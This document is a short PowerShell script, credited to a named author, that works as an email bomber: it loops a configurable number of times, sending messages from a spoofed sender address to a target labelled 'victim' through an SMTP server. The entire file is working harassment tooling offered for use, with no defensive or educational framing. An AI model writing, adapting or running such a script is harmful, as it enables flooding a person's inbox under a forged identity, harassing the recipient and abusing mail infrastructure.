# Simple Mail-Bomber for PowerShell 2.0
# [By]: TheMightyShiv | [GitHub]: https://github.com/themightyshiv

# Global Variables
$PSEmailServer = 'smtp.server.com'
$MsgFrom = 'spoofed@email.com'
$MsgTo = 'victim@email.com'
$MsgSubject = 'Subject Here'
$MsgBody = 'Body Here'
$MsgLimit = 20
$MsgDelay = 1

# While Loop To Send Messages
$MsgNum = 1
while ($MsgNum -le $MsgLimit) {
  clear
  Write-Host 'Simple Mail-Bomber for PowerShell 2.0'
  Write-Host ''
  Write-Host ' [*] Sending E-Mail '$MsgNum 'of'$MsgLimit
  Send-MailMessage -From $MsgFrom -To $MsgTo -Subject $MsgSubject -Body $MsgBody
  $MsgNum++
  Start-Sleep -s $MsgDelay
}

# Finished Message
clear
Write-Host 'Simple Mail-Bomber for PowerShell 2.0'
Write-Host ''
Write-Host ' [*] Mail-Bombing Completed.'

